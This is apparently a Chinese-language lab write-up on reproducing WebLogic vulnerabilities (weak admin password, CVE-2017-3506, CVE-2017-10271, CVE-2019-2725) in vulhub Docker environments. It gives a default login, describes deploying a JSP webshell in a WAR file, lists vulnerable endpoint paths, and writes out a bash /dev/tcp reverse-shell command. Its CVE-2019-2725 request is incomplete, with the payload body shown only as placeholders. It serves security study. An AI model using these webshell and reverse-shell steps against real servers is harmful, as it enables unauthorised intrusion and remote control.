# 简介
WebLogic是[美国Oracle公司](https://baike.baidu.com/item/美国Oracle公司/9952086)出品的一个application
server，确切的说是一个基于[JAVAEE](https://baike.baidu.com/item/JAVAEE/3066623)架构的[中间件](https://baike.baidu.com/item/中间件/452240)，WebLogic是用于[开发](https://baike.baidu.com/item/开发/9400971)、集成、部署和管理大型分布式Web应用、[网络应用](https://baike.baidu.com/item/网络应用/2196523)和[数据库应用](https://baike.baidu.com/item/数据库应用/10563731)的Java[应用服务器](https://baike.baidu.com/item/应用服务器)。将Java的动态功能和Java
Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。
**WebLogic** 是美商Oracle的主要产品之一，是并购BEA得来。是商业市场上主要的Java（J2EE）应用服务器软件（application
server）之一，是世界上第一个成功商业化的[J2EE应用服务器](https://baike.baidu.com/item/J2EE应用服务器/12678909),
已推出到12c(12.2.1.4) 版。而此产品也延伸出WebLogic Portal，WebLogic
Integration等企业用的中间件（但当下Oracle主要以Fusion Middleware融合中间件来取代这些WebLogic
Server之外的企业包），以及OEPE(Oracle Enterprise Pack for Eclipse)开发工具。
本文将对一些常见的weblogic漏洞进行漏洞分析及复现，漏洞环境基于vulhub搭建。
# 漏洞环境搭建
这里我为了方便，使用的是vulhub搭建docker进行漏洞复现
首先安装curl和docker
    sudo apt install curl
    sudo apt install docker.io
    docker -v //查看是否安装成功
然后安装python和pip环境，命令如下
    sudo apt install python
    curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py
    sudo python get-pip.py
    pip -V //查看是否安装成功
然后再安装docker-compose
    pip install docker-compose
    sudo apt install docker-compose
    docker-compose -v
到这个地方docker环境就已经搭建好了，这时候需要从github上把vulhub的漏洞环境给clone下来，这里直接clone网不太好，我就直接下载下来了copy到了靶机上
    git clone https://github.com/vulhub/vulhub.git
# 弱口令
## 漏洞原理
在weblogic搭建好之后没有修改进入后台的密码导致弱口令登录获得webshell
## 漏洞复现
进入`weak_password`的docker环境
* * *
访问一下7001端口，这里出现404是正常的
访问
这里注意一下不能使用bp抓包去爆破，错误密码5次之后就会自动锁定，这里使用weblogic/Oracle@123登陆后台
登录后台后点击部署
点击安装
点击上传文件
这里需要准备一个war包，这个war包里面存放的就是一个jsp的马，使用如下命令打包当前文件夹下的所有文件
    jar -cvf aaa.war .
然后上传aaa.war点击下一步
一直Next即可
到这里点击完成
可以看到这里aaa.war已经部署成功
直接上冰蝎连接即可，这里aaa是我的war名，shell.jsp是打包在war里面的文件
# CVE-2017-3506
XMLDecoder反序列化漏洞(CVE-2017-3506)
## 漏洞原理
在/wls-wsat/CoordinatorPortType（POST）处构造SOAP（XML）格式的请求，在解析的过程中导致XMLDecoder反序列化漏洞
**分析漏洞调用链**
weblogic.wsee.jaxws.workcontext.WorkContextServerTube.processRequest
weblogic.wsee.jaxws.workcontext.WorkContextTube.readHeaderOld
weblogic.wsee.workarea.WorkContextXmlInputAdapter
先看一下weblogic.wsee.jaxws.workcontext.WorkContextServerTube.processRequest方法
第43行，将localHeader1变量带入到readHeaderOld()方法中。localHeader1变量由第41行定义，其值为work:WorkContext
[/work:WorkContext](/work:WorkContext) 标签包裹的数据。
    ...
跟进readHeaderOld()方法（weblogic.wsee.jaxws.workcontext.WorkContextTube.readHeaderOld）
在106行，有一句new WorkContextXmlInputAdapter(new
ByteArrayInputStream(localByteArrayOutputStream.toByteArray()))，创建了WorkContextXmlInputAdapter()对象（即对WorkContextXmlInputAdapter类进行了实例化），带入构造函数的参数即为传入的XML格式序列化数据。
跟进至WorkContextXmlInputAdapter类中（weblogic.wsee.workarea.WorkContextXmlInputAdapter
）
第19行，此处通过XMLDecoder反序列化，输入内容可控，故漏洞产生。
## 漏洞复现
这里使用的`weak_password`环境weblogic的版本为10.3.6，也存在这个漏洞，所以继续使用这个docker
访问以下目录中的一种，有回显如下图可以判断wls-wsat组件存在
    /wls-wsat/CoordinatorPortType
    /wls-wsat/RegistrationPortTypeRPC
    /wls-wsat/ParticipantPortType
    /wls-wsat/RegistrationRequesterPortType
    /wls-wsat/CoordinatorPortType11
    /wls-wsat/RegistrationPortTypeRPC11
    /wls-wsat/ParticipantPortType11
    /wls-wsat/RegistrationRequesterPortType11
在当前页面抓包之后在标签之间分别写存放jsp的路径和要写入的shell
然后直接冰蝎连接即可
# CVE-2017-10271
XMLDecoder反序列化漏洞(CVE-2017-10271)
## 漏洞原理
在CVE-2017-3506之前，不对payload进行验证，使用object
tag可以RCE，CVE-2017-3506的补丁在`weblogic/wsee/workarea/WorkContextXmlInputAdapter.java`中添加了validate方法，在解析xml时，Element字段出现object
tag就抛出运行时异常，不过这次防护力度不够，导致了CVE-2017-10271，利用方式类似，使用了void
tag进行RCE，于是CVE-2017-10271的补丁将object、new、method关键字加入黑名单，针对void和array这两个元素是有选择性的抛异常，其中当解析到void元素后，还会进一步解析该元素中的属性名，若没有匹配上index关键字才会抛出异常。而针对array元素而言，在解析到该元素属性名匹配class关键字的前提下，还会解析该属性值，若没有匹配上byte关键字，才会抛出运行时异常。总之，这次的补丁基本上限定了不能生成java实例。
## 漏洞复现
进入CVE-2017-10271对应的docker环境
访问
bp在当前页面抓包后使用bash命令反弹shell，nc开启端口即可
    /bin/bash
    -c
    bash -i >& /dev/tcp/192.168.1.2/5555 0>&1
# CVE-2019-2725
wls-wsat反序列化漏洞(CVE-2019-2725)。攻击者可以发送精心构造的恶意HTTP请求，在未授权的情况下远程执行命令。
## 漏洞原理
漏洞触发点：bea_wls9_async_response.war、wsat.war
影响版本：Oracle WebLogic Server 10.* 、Oracle WebLogic Server 12.1.3
通过CVE-2019-2725补丁分析发现，较上一个漏洞CVE-2017-10271补丁而言，官方新增了对class元素的过滤，并且array元素的length属性转换为整形后不得大于10000：
本次漏洞利用某个元素成功替换了补丁所限制的元素，再次绕过了补丁黑名单策略，最终造成远程命令执行。
## 漏洞复现
访问以下目录中的一种，如下图所示则漏洞
    /_async/AsyncResponseService
    /_async/AsyncResponseServiceJms
    /_async/AsyncResponseServiceHttps
    /_async/AsyncResponseServiceSoap12
    /_async/AsyncResponseServiceSoap12Jms
    /_async/AsyncResponseServiceSoap12Https
bp在当前页面抓包，使用bash命令反弹shell，nc开启端口监听即可
    GET /_async/AsyncResponseService HTTP/1.1
    Host: 192.168.1.10:7001
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Connection: close
    Upgrade-Insecure-Requests: 1
    Cache-Control: max-age=0
    Content-Length: 782
    Accept-Encoding: gzip, deflate
    SOAPAction:
    Accept: */*
    User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
    Connection: keep-alive
    content-type: text/xml
    xx
    xx